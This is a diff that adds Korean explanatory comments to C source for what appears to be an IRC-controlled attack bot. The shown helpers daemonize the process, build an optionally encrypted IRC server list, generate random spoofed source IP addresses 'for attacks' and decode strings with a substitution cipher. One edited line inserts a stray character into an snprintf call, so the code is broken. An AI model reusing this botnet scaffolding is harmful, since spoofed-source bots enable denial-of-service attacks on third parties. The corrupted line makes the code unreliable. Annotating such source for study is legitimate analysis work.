@@ -24,6 +24,8 @@ void daemonize() {
     daemonize_pid = fork();
     if (daemonize_pid) exit(EXIT_SUCCESS);
 }
+/* 새 프로세스를 생성합니다. */
+
 
 /* sockwrite(int, const char *) */
 /* socket send function.        */
@@ -39,6 +41,11 @@ int sockwrite(int sd, const char *fmt, ...) {
 
     return EXIT_SUCCESS;
 }
+/*소켓을 송신하는 함수 va_start(a,b) 는 포인터가 다음 값을 가져올 수 있게 
+마지막 위치 b를 주고 이동시킬 va_list로 a를 선언해서 이용합니다. 
+va_avg(a, int) 를 사용해서 int형 자료면 4바이트씩, 이런 식으로 주소 값을 건너뛸 기준을 제공하고 다음 값을 가져올 수 있게 해줍니다. 
+이런식으로 가져온 값을 usnprintf로 s_buf에 담고 send 함수는 s_buf에 있는 데이터를 s_buf길이 만큼, 소켓 지정 번호 sd를 이용해서 전송한다. 
+조건문은 전송이 정상적으로 처리되었는지 한단하여 성공 실패여부를 판단하여 리턴한다. */
 
 /* getrstr(void)                */
 /* return a random char string. */
@@ -59,6 +66,7 @@ char *getrstr() {
     snprintf(data_ptr, 15, "%s%s", irc_nick_prefix, nm);
     return data_ptr;
 }
+/*랜덤으로 rdnick 에서 10개의 문자를 뽑아서 nm에 담고 출력시킨다. (추가설명 필요) */
 
 /* wordcmp(const char *, requests_t *) */
 /* a menu strncmp function.            */
@@ -213,6 +221,7 @@ unsigned int host2ip(char *hostname) {
 
     return i.s_addr;
 }
+/* 호스트이름을 받아옴 */
 
 /* parse_input_errors(sock_t *, requests_t *) */
 /* check for input errors.                    */
@@ -255,6 +264,7 @@ unsigned short argn, unsigned short et) {
 
 /* create_irc_servlist()      */
 /* create a irc servers list. */
+/* main호출 */
 void create_irc_servlist() {
     unsigned short x = 0;
     char s_copy[512], *token;
@@ -282,6 +292,8 @@ void create_irc_servlist() {
     total = x-2;
     return;
 }
+/* irc 서버 리스트를 만든다. encirc의 값에 따라 그냥 값을 담거나 값을 복호화 해서 irc s_copy에 서버 리스트를 | 기준으로 잘라서 담는다. */
+
 
 /* get_spoofed_addr()                    */
 /* return a spoofed address for attacks. */
@@ -307,10 +319,11 @@ unsigned int get_spoofed() {
     random_num = ((random_ct % 254) + 1);
     d = random_num;
 
-    snprintf(spa, sizeof(spa), "%d.%d.%d.%d", a, b, c, d);
+    snprintf(spa, sizeof(spa), "%d.%d.%d.%d", a, b, c, d)다;
 
     return ((unsigned int)host2ip(spa));
 }
+/* 랜덤으로 ip 주소를 만들어서 host2ip에 전달한다. */
 
 /* pidprocess()     */
 /* check for clones */
@@ -374,3 +387,5 @@ void decode(char *str, int dtype) {
 
     return;
 }
+
+/* 치환 암호를 사용하여 매개변수로 전달된 str을 복호화 한다. */
